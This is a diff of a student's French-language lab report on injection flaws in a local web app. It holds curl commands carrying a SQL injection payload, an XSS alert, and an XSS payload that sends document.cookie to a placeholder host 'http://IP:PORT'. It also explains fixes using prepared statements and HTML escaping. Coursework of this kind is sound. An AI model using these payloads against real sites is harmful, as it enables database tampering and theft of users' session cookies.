@@ -1,44 +1,65 @@
-# TP3-Crypto
+# Rendu "Injection"
 
+## Binôme
 
+**Nom :** Bouhjira  
+**Prénom :** Ali  
+**Email :** ali.bouhjira.etu@univ-lille.fr
 
 ## Question 1
-- Il faut chiffrer le fichier avec une clé aléatoire. 
-- Chiffrer le chiffrement précédant avec un des deux mots de passe et stocker le résultat dans une clé.
-- Chiffrer la clé aléatoire (celle qui a chiffré le fichier) avec l'autre mot de passe et stocker le résultat dans l'autre clé.
-Ainsi, pour déchiffrer, il faudra posséder les deux clés et les deux mots de passe pour pouvoir reconstituer le fichier initial.
 
+### Quel est ce mécanisme ?
+
+Une expression régulière (regex) est utilisée dans une fonction `validate` afin de vérifier que la chaîne saisie ne contient que des lettres. Cette validation est effectuée lors d'un événement côté client.
+
+### Est-il efficace ? Pourquoi ?
+
+Non, ce mécanisme n'est pas totalement efficace. La validation est réalisée uniquement lors de l'événement `onsubmit`, côté client. La chaîne n'est donc pas vérifiée une fois reçue par le serveur. Si l'on trouve un moyen d'envoyer directement une requête au serveur, la chaîne sera acceptée même si elle contient des caractères spéciaux.
 
 ## Question 2
-Pour simuler les deux clé usb deux dossiers clé1 et clé2 sont créé a l'initialisation. Pour facilité le test le fichier de mot de passe est présent dans le répertoire, mais peut être supprimer après l'initialisation.
+
+### Votre commande curl
+
+```bash
+curl 'http://localhost:8080/' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://localhost:8080' -H 'Connection: keep-alive' -H 'Referer: http://localhost:8080/' -H 'Cookie: ExempleCookie="Valeur du cookie"' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'chaine=//--&submit=OK'
+```
 
 ## Question 3
-Pour ajouter un responsable légal par admin nous allons nous baser sur l'exercice 1.
-Au lieu de chiffrer une seule fois le fichier, nous allons le chiffrer pour chaque combinaison admin/representant. Les deux admin ont les cle 1 et 2, les représentant ont les clés 3 et 4 :
-- chiffrer le fichier avec une clé aléatoire.*
 
-- Chiffrer le contenu chiffré avec le mot de passe de l'admin 1, palcer le résultat dans la clé 1, chiffrer la clé aléatoire avec le mot de passe de l'admin 2 et placer le résultat dans la clé 2.
+### Votre commande curl permettant d'ajouter une entrée avec un contenu arbitraire dans le champ `who`
 
-- Chiffrer le contenu chiffré avec le mot de passe de l'admin 1, placer le résultat dans la cle 1, chiffrer la clé aléatoire avec le mot de passe du représentant 2 et placer le résultat dans la clé 4.
+```bash
+curl "http://localhost:8080/" -X POST -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://localhost:8080" -H "Connection: keep-alive" -H "Referer: http://localhost:8080/" -H "Cookie: ExempleCookie=\"Valeur du cookie\"" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" --data-raw "chaine=y' , 'contenu arbitraire') -- &submit=OK"
+```
 
-- Chiffrer le contenu chiffré avec le mot de passe de l'admin 2, placer le résultat dans la clé 2, chiffrer la clé aléatoire avec le mot de passe du représentant 1 et placer le résultat dans la clé 3.
+### Expliquez comment obtenir des informations sur une autre table
 
-- Chiffrer le contenu chiffré avec le mot de passe du représentant 1, placer le résultat dans la clé 3, chiffrer la clé aléatoire avec le mot de passe du représentant 2 et placer le résultat dans la clé 4.
-
+Si nous connaissons le nom d'une autre table, il est potentiellement possible d'exploiter l'injection SQL afin de modifier la requête exécutée par le serveur. Cela pourrait permettre d'accéder à des informations provenant d'autres tables de la base de données.
 
 ## Question 4
-Après initialisation, supprimez deux clés pour simuler une connexion a deux. Tenter de connecter l'admin 1 et son propre représentant générera une erreur, pareille pour le 2 et sont représentant
+
+### Correction de la faille de sécurité
+
+Une manière de corriger cette faille consiste à ne plus construire les requêtes SQL par concaténation de chaînes de caractères. Il est préférable d'utiliser les requêtes préparées fournies par la bibliothèque `mysql.connector`. Cette méthode permet de séparer les données de la requête SQL et empêche ainsi qu'une entrée utilisateur soit interprétée comme du code SQL.
 
 ## Question 5
-Pour supprimer les droits d'un représentant dans notre modèle, il faut les 3 autres clé les trois autres mots de passe et supprimer des clés présente l'association de fichier avec la clé absente pour qu'il ne puisse plus jamais déchiffrer le fichier même en présence d'une autre clé.
 
+### Commande curl pour afficher une fenêtre de dialogue
 
-## Correction du modèle 
+```bash
+curl "http://localhost:8080/" -X POST -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://localhost:8080" -H "Connection: keep-alive" -H "Referer: http://localhost:8080/" -H "Cookie: ExempleCookie=\"Valeur du cookie\"" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" --data-raw "chaine=<script>alert()</script>&submit=OK"
+```
 
-Après l'implémentation, il est devenu évident que stocker le fichier dans une des clés poserait problème pour modifier le fichier après le démarrage en retirant les clés.
-Pour améliorer le modèle nous allons rajouter une étape :
-Nous allons chiffrer le fichier avec une cle aléatoire K.
-Nous chiffrons k avec une clé aléatoire k2.
-Nous chiffrons le résultat du chiffre de k avec le md1 puis le plaçons dans la clé 1.
-Nous chiffrons la clé k2 avec me mdp2 et plaçons le résultat dans clé 2.
+### Commande curl pour lire les cookies
 
+```bash
+curl "http://localhost:8080/" -X POST -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://localhost:8080" -H "Connection: keep-alive" -H "Referer: http://localhost:8080/" -H "Cookie: ExempleCookie=\"Valeur du cookie\"" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" --data-raw "chaine=<script>document.location='http://IP:PORT'+document.cookie;</script>&submit=OK"
+```
+
+## Question 6
+
+### Correction de la faille XSS
+
+L'utilisation de la fonction `html.escape()` permet de convertir les caractères spéciaux tels que `<` et `>` en entités HTML sûres. Ainsi, le navigateur les affiche comme du texte et n'exécute pas le contenu comme un script.
+
+La mesure la plus importante consiste à échapper les données avant leur affichage. Il est également possible de les échapper avant leur insertion dans la base de données afin d'ajouter une protection supplémentaire, mais cela peut modifier les données stockées et n'est généralement pas recommandé.
